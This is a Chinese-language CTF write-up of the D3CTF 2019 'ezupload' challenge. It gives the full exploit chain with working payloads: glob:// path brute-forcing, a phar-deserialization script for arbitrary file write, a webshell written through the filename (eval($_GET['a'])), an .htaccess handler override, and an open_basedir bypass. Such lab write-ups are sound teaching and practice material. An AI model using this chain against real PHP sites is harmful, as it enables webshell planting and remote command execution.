# ezupload

## 题目简述

题目源码公开，核心是反序列化导致的任意文件写入和上传目录路径不确定。由于析构阶段工作目录可能变化，相对路径写入不可靠，需要借 `glob://` 爆破 `/var/www/html/*/upload/...` 下的真实绝对路径。拿到路径后，通过可控文件名写入 PHP 代码，再上传 `.htaccess` 把 `.txt` 当作 PHP 解析，最后绕过 `open_basedir` 完成命令执行。

题目资料地址：https://github.com/Lou00/d3ctf_2019_ezupload

公开 PoC 的利用流程是先上传文件取得 upload id，再用 `glob:///var/www/html/.../upload/<id>/*` 逐字符爆破真实 webroot；随后上传 `.htaccess`，内容为 `AddHandler php7-script .txt`，再用文件名写入 `<?php ... eval($_GET["a"]);`。PoC 通过 phar metadata 中嵌套的 `dir` 对象触发任意文件写入，最后用多次 `chdir('..')` 和 `ini_set('open_basedir','/')` 绕过 `open_basedir`，读取的目标文件名为 `F1aG_1s_H4r4`。

## 解题过程

#### 环境

题目源码入口见题目资料地址。源码中上传、计数和反序列化触发点集中在同一套接口里，后续 payload 都围绕 `action=count/upload`、`url`、`filename` 和 `dir` 参数展开。

#### 前言

赛后看到了Nu1l的非预期,直接把第一考点绕过了  
导致给的一些hint没啥用 (hint真是害人不浅 *(:з」∠)*

#### 预期解

通过审计代码可以发现存在反序列化漏洞,可以任意文件写入  
但是如果是用相对路径的话,发现无法写入  
通过hint3知道

PHP 文档里说明，shutdown 阶段调用析构函数时，当前工作目录可能和普通脚本执行阶段不同；如果代码里用相对路径写文件，就会因为工作目录变化写到错误位置。

在析构函数中工作目录可能会变  
以下代码可以测试

```php
<?php
error_reporting(0);

class dir {
    public function __construct() {
        system("pwd");
    }

    public function __destruct() {
        system("pwd");
    }
}

highlight_file(__FILE__);
$dir = new dir();
```

构造函数和析构函数中打印的目录不同，说明必须先拿到真实绝对路径。

意思是要找到绝对路径  
所以第一部分的payload是

```perl
action=count&url=1&filename=1&dir=glob:///var/www/html/*/upload/{your_upload_path}/*
```

通过爆破得到路径(然而非了  
得到路径后就可以通过文件名写shell了  
构造类似与下面的文件名

```
action=upload&url=REMOTE_FILE&filename=<?php echo 1.1;eval($_GET["a"]);
```

构造反序列化

```php
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($usedir,$url,$filename){
    $this->userdir = $usedir;
    $this->url = $url;
    $this->filename = $filename;
    }
}
$a = new dir('upload/{your_upload_path}','','');
$b = new dir($a,'','/var/www/html/xxx/upload/{your_upload_path}/2');
$phar = new Phar("phar.phar"); 
$phar->startBuffering();
$phar->setStub("__HALT_COMPILER();?>;"); 
$phar->setMetadata($b); 
$phar->addFromString("test.txt", "test"); 
$phar->stopBuffering();
echo urlencode(serialize($b));
```

上传后通过 `file_get_contents` 触发

```
action=upload&url=phar://upload/{your_upload_path}/1.jpg&filename=2.jpg
```

然后就会发现一个带有 `<?`的txt文件  
最后上传一个`.htaccess` 文件  
内容为

```
AddHandler php7-script .txt
```

即可解析php  
最后是bypass `open_basedir`

## 方法总结

- 核心技巧：用 `glob://` 在受限文件读取/计数功能中枚举真实上传绝对路径，再利用反序列化对象的文件写入能力落地 Web shell。
- 识别信号：文件写入只能相对目录失败、析构函数改变工作目录、题目提示 glob 或路径爆破时，应先解决绝对路径定位问题。
- 复用要点：上传链不一定直接写 `.php`，可以先写带 PHP 代码的文本文件，再配合 `.htaccess` 修改解析规则；触发 phar/反序列化时要把实际上传路径替换进 payload。
